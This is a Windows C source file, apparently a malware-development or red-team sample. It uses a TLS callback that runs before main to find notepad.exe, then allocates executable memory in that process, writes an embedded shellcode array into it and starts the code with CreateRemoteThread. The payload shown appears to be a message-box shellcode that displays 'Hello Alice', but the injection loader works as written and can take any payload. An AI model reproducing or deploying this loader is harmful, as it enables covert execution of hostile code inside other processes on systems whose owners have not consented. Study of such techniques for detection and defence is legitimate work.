#include "windows.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// Custom system error printing function
void PrintError(const char* text)
{
    DWORD err = GetLastError();
    LPSTR buf = nullptr;

    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |       // Allocate a buffer, retrieve from system error message, ignore inserts
        FORMAT_MESSAGE_FROM_SYSTEM |           // Get the message from the system's message table
        FORMAT_MESSAGE_IGNORE_INSERTS,         // Do not include insert sequences in the message
        nullptr,                               // lpSource: Pointer to the source; use nullptr for system messages
        err,                                   // dwMessageId: The error code for which we want the message
        0,                                     // dwLanguageId: Use default language
        (LPSTR)&buf,                           // lpBuffer: Allocate a buffer to receive the formatted message
        0,                                     // nSize: Size of the buffer; 0 to use the allocated size
        nullptr);                              // Arguments: Pointer to additional arguments; nullptr if not needed

    if (buf) // strip trailing CR/LF
    {
        char* p = buf;
        while (*p && (*p != '\r') && (*p != '\n')) ++p;
        *p = '\0';
    }

    printf("%s (0x%lX: %s)\n", text, err, buf ? buf : "<unknown>");    // Print system error code with it's description
    LocalFree(buf);                          // hMem: Pointer to the memory to be freed; frees the allocated buffer from FormatMessage
}

// TLSCallbacks is triggered during DLL load/unload events and handles TLS notifications
void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved);

// Linker directives to include TLS callback symbols based on architecture (x86 or x64)
#ifdef _M_IX86  // For 32-bit architecture
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:__tls_callback")
#else           // For 64-bit architecture
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback")
#endif

// Declare a segment for TLS callback data based on architecture
EXTERN_C
#ifdef _M_X64   // For x64, use a constant segment for TLS callbacks
#pragma const_seg (".CRT$XLB")
const
#else   // For x86, use a data segment for TLS callbacks
#pragma data_seg (".CRT$XLB")
#endif

// Pointer to the TLS callback function
PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks;
#pragma data_seg ()
#pragma const_seg ()


unsigned char payload[] = {
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41,
    0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
    0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72,
    0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
    0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2,
    0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f,
    0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
    0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,
    0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01,
    0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
    0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
    0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b,
    0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
    0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7,
    0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x00, 0x00, 0x00, 0x3e,
    0x4c, 0x8d, 0x85, 0x0a, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
    0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff,
    0xd5, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x41, 0x6c, 0x69, 0x63, 0x65, 0x00, 0x6c,
    0x6f, 0x75, 0x6c, 0x00
};

unsigned int payload_size = sizeof(payload);

// Find the PID of a running process by its executable name
int find_proc(const wchar_t* procname) {
    HANDLE handle_ProcSnap;   // Handle for the snapshot of processes
    PROCESSENTRY32 PE_Entry;  // Structure to hold process information
    int pid = 0;

    // Create a snapshot of all running processes
    handle_ProcSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS,            // dwFlags: Specifies that the snapshot will include all processes
        0                              // th32ProcessID: Must be 0, as we want to capture all processes
    );
    if (INVALID_HANDLE_VALUE == handle_ProcSnap) 
        return 0;

    // Set structure size for correct API usage
    PE_Entry.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process in the snapshot
    if (!Process32FirstW(
        handle_ProcSnap,                // hSnapshot: Handle to the snapshot of processes
        &PE_Entry                       // lppe: Pointer to a PROCESSENTRY32 structure that receives the information 
    )) {
        CloseHandle(handle_ProcSnap);   // Close handle if the first process retrieval fails
        return 0;
    }
    else {
        // Compare the given process name with the first process's executable name
        if (lstrcmpiW(
            procname,                       // lpString1: Pointer to the first string (the process name to find)
            PE_Entry.szExeFile              // lpString2: Pointer to the second string (the executable name of the current process)
        ) == 0) {
            pid = PE_Entry.th32ProcessID;   // Store the process ID if a match is found
            CloseHandle(handle_ProcSnap);   // Close the snapshot handle as we no longer need it
            return pid;
        }
    }

    // Iterate through the remaining processes in the snapshot
    while (Process32NextW(
        handle_ProcSnap,               // hSnapshot: Handle to the snapshot of processes
        &PE_Entry                      // lppe: Pointer to a PROCESSENTRY32 structure that receives the information 
    )) {
        if (lstrcmpiW(
            procname,                      // lpString1: Pointer to the first string (the process name to find)
            PE_Entry.szExeFile             // lpString2: Pointer to the second string (the executable name of the current process)
        ) == 0) {
            pid = PE_Entry.th32ProcessID;  // Store the process ID if a match is found
            break;
        }
    }

    CloseHandle(handle_ProcSnap);          // Close the snapshot handle
    return pid;
}

// Inject the payload into the specified process
int injection(HANDLE handle_proc, unsigned char* payload, unsigned int payload_size) {

    LPVOID pRemoteSpace = NULL;   // Pointer for the allocated remote memory in the target process
    HANDLE hThread = NULL;        // Handle for the created remote thread
    
    // Allocate memory in the target process for the payload
    pRemoteSpace = VirtualAllocEx(
        handle_proc,                 // hProcess: Handle to the target process
        NULL,                        // lpAddress: NULL indicates the system chooses the address
        payload_size,                // dwSize: Size of the memory to allocate
        MEM_COMMIT,                  // flAllocationType: Commit the allocated pages
        PAGE_EXECUTE_READ            // flProtect: Memory can be executed and read
    );

    // Write the payload into the allocated memory space of the target process
    WriteProcessMemory(
        handle_proc,                 // hProcess: Handle to the target process
        pRemoteSpace,                // lpBaseAddress: Pointer to the allocated memory in the target process
        (PVOID)payload,              // lpBuffer: Pointer to the buffer that contains the data to write
        (SIZE_T)payload_size,        // nSize: Number of bytes to write
        (SIZE_T*)NULL                // lpNumberOfBytesWritten: Pointer to a variable that receives the number of bytes written (not used here)
    );

    // Create a remote thread in the target process to execute the injected payload
    hThread = CreateRemoteThread(
        handle_proc,                 // hThread: Handle to the target process
        NULL,                        // lpThreadAttributes: NULL uses default security attributes
        0,                           // dwStackSize: 0 lets the system use the default stack size
        (LPTHREAD_START_ROUTINE)pRemoteSpace, // lpStartAddress: Address of the function to execute
        NULL,                        // lpParameter: Pointer to a variable to pass to the thread function (not used here)
        0,                           // dwCreationFlags: 0 indicates the thread runs immediately
        NULL                         // lpThreadId: Pointer to a variable that receives the thread ID (not used here)
    );

    // Check if the thread creation was successful
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);   // Wait for the thread to complete for up to 500 milliseconds
        CloseHandle(hThread);                // Close the thread handle
        return 0;
    }
    return -1;
}

// TLSCallbacks declaration
void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved){
    int pid = NULL;
    HANDLE handle_proc = NULL;   // Handle for the target process

    printf("Searching for Notepad...\n");
    pid = find_proc(L"notepad.exe");  // Get the PID of Notepad

    // Check if the PID was found
    if (pid) {
        printf("Notepad found\n");
        // Open a handle to the Notepad process with specific access rights
        handle_proc = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, // dwDesiredAccess: Access rights for the process
            FALSE,                       // bInheritHandle: FALSE to prevent handle inheritance
            (DWORD)pid                   // dwProcessId: The process ID of Notepad
        );

        // Check if the handle was successfully obtained
        if (handle_proc != NULL) {
            // Notify about the injection
            MessageBoxW(
                NULL,                             // hWnd: Handle to the owner window; NULL makes it a top-level window
                L"Injected in Notepad",    // lpText: Text displayed in the message box
                L"TLS injection",                 // lpCaption: Title of the message box
                0                                 // uType: Type of message box; 0 specifies a standard OK button
            );

            injection(handle_proc, payload, payload_size);   // Call injection with the target process handle and payload
            CloseHandle(handle_proc);   // Close the process handle
        }
    }
    else {
        PrintError("Notepad not found");
    }

    ExitProcess(0);   // Terminate the current process
}

// end declaration

// This function will not be executed
int main(int argc, char* argv[])
{
    return 0;
}